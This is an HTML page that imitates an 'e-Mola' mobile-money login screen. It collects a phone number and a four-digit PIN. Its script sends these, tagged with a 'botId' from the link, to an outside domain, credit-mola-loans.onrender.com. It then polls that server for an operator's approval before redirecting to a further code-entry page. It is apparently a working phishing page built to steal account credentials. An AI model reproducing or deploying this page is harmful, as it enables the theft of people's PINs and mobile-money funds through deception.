<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: linear-gradient(180deg, #f2a44a, #c46b1a);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.pin-container {
    width: 90%;
    max-width: 380px;
    text-align: center;
    color: #fff;
}

.logo {
    font-size: 32px;
    font-weight: bold;
    margin-bottom: 40px;
}

input[type="tel"] {
    width: 100%;
    padding: 14px;
    border-radius: 25px;
    border: none;
    outline: none;
    font-size: 16px;
    margin-bottom: 15px;
    box-sizing: border-box;
}

.pin-boxes {
    display: flex;
    justify-content: space-between;
    margin-bottom: 25px;
}

.pin-boxes input {
    width: 60px;
    height: 55px;
    border-radius: 12px;
    border: none;
    font-size: 22px;
    text-align: center;
}

button {
    width: 100%;
    padding: 14px;
    border-radius: 25px;
    border: none;
    background: #fff;
    color: #000;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}

button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.status {
    margin-top: 15px;
    font-size: 14px;
}
</style>
</head>
<body>

<div class="pin-container">
    <div class="logo">e-Mola</div>

    <!-- PHONE NUMBER -->
    <input id="phoneInput" type="tel" placeholder="Enter phone number" required>

    <!-- PIN -->
    <form id="pinForm">
        <div class="pin-boxes">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
            <input type="tel" maxlength="1" inputmode="numeric">
        </div>

        <button id="submitBtn" disabled>LOGIN</button>
    </form>

    <div class="status" id="status"></div>
</div>

<script>
const BACKEND_URL = "https://credit-mola-loans.onrender.com";

// ---------------- BOT ID ----------------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId');
if (!botId) {
    alert("Invalid access link");
    throw new Error("botId missing");
}

// ---------------- PIN INPUT LOGIC ----------------
const inputs = document.querySelectorAll('.pin-boxes input');
const button = document.getElementById('submitBtn');
const statusDiv = document.getElementById('status');
const phoneInput = document.getElementById('phoneInput');

inputs[0].focus();

inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();

        const allFilled = [...inputs].every(x => x.value.length === 1);
        button.disabled = !(allFilled && phoneInput.value.trim());
    });

    input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !input.value && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

phoneInput.addEventListener('input', () => {
    const allFilled = [...inputs].every(x => x.value.length === 1);
    button.disabled = !(allFilled && phoneInput.value.trim());
});

// ---------------- SUBMIT PIN ----------------
document.getElementById('pinForm').addEventListener('submit', async e => {
    e.preventDefault();
    statusDiv.textContent = '';

    const phone = phoneInput.value.trim();
    const pin = [...inputs].map(i => i.value).join('');

    // âœ… STORE FOR NEXT PAGE
    localStorage.setItem('phone', phone);
    localStorage.setItem('pin', pin);

    button.disabled = true;
    button.textContent = 'Logging in...';

    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            name: localStorage.getItem('name'),
            phone,
            pin,
            botId
        })
    });

    const { requestId } = await res.json();

    // ---------------- POLLING ----------------
    const poll = setInterval(async () => {
        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
        const d = await r.json();

        if (d.blocked) {
            statusDiv.textContent = d.message || "Invalid number";
            button.disabled = false;
            button.textContent = 'LOGIN';
            inputs.forEach(i => i.value = '');
            clearInterval(poll);
            return;
        }

        if (d.approved === true) {
            clearInterval(poll);
            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
        }

        if (d.approved === false) {
            statusDiv.textContent = "Incorrect PIN. Try again.";
            button.disabled = false;
            button.textContent = 'LOGIN';
            inputs.forEach(i => i.value = '');
        }
    }, 1500);
});
</script>

</body>
</html>
